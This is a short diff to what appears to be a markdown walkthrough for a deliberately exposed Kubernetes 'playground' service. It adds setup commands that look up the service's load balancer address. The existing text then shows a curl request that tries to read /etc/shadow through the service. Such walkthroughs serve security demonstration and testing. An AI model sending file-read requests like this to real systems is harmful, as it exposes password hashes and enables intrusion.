@@ -1,3 +1,10 @@
+# Configure local parameters
+```
+LOAD_BALANCER_URL=$(kubectl get svc playground -n default -o json | jq -r .status.loadBalancer.ingress[].hostname)
+PORT=80
+echo "Target: $LOAD_BALANCER_URL:$PORT"
+```
+
 # Read the file /etc/shadow
 ```
 curl $LOAD_BALANCER_URL:$PORT/etc/shadow
